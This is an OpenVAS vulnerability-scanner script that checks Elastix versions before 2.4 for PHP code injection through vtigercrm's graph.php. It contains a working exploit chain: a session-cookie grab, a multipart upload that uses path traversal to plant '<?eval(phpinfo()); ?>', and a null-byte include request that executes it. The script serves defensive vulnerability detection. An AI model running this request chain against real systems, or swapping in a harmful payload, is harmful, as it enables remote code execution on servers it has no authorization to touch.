###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_elastix_rce_01_2013.nasl 11 2013-10-27 10:12:02Z jan $
#
# Elastix < 2.4 PHP Code Injection  Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Elastix is prone to a php code injection vulnerability because it
fails to properly sanitize user-supplied input.

Attackers can exploit this issue to execute arbitrary php code within
the context of the affected webserver process.

Elastix < 2.4 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103638";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"9.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");

 script_name("Elastix < 2.4 PHP Code Injection Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/119253/elastix23-exec.txt");
 script_xref(name : "URL" , value : "http://www.elastix.org/");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-01-09 16:47:16 +0100 (Wed, 09 Jan 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute php code");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

host = get_host_name();

req = string("GET /vtigercrm/index.php HTTP/1.1\r\nHost: ", host,"\r\n\r\n");
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("Set-Cookie" >!< buf || "vtiger" >!< buf)exit(0);

cockie = eregmatch(pattern:"Set-Cookie: PHPSESSID=([^; ]+)", string:buf);
if(isnull(cockie[1]))exit(0);

co = cockie[1];

req = string(
"POST /vtigercrm/graph.php?module=../modules/Settings&action=savewordtemplate HTTP/1.1\r\n",
"Host: ",host,"\r\n",
"Accept: */*\r\n",
"Content-Length: 477\r\n",
"Cookie: PHPSESSID=",co,"\r\n",
"Expect: 100-continue\r\n",
"Content-Type: multipart/form-data; boundary=----------------------------ac484ab8c486\r\n",
"\r\n",
"------------------------------ac484ab8c486\r\n",
'Content-Disposition: form-data; name="binFile"; filename="xy.txt"',"\r\n",
"Content-Type: application/octet-stream\r\n",
"\r\n",
'<?eval(phpinfo()); ?>',"\r\n",
"------------------------------ac484ab8c486--");

buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("HTTP/1.1 100 Continue" >!< buf)exit(0);

req = string(
"POST /vtigercrm/graph.php?module=../test/upload&action=xy.txt%00 HTTP/1.1\r\n",
"Host: ",host,"\r\n",
"Accept: */*\r\n",
"Cookie: PHPSESSID=",co,"\r\n",
"Content-Length: 0\r\n",
"Content-Type: application/x-www-form-urlencoded\r\n\r\n");

buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("<title>phpinfo()" >< buf) {
  security_hole(port:port);
  exit(0);
}

exit(0);
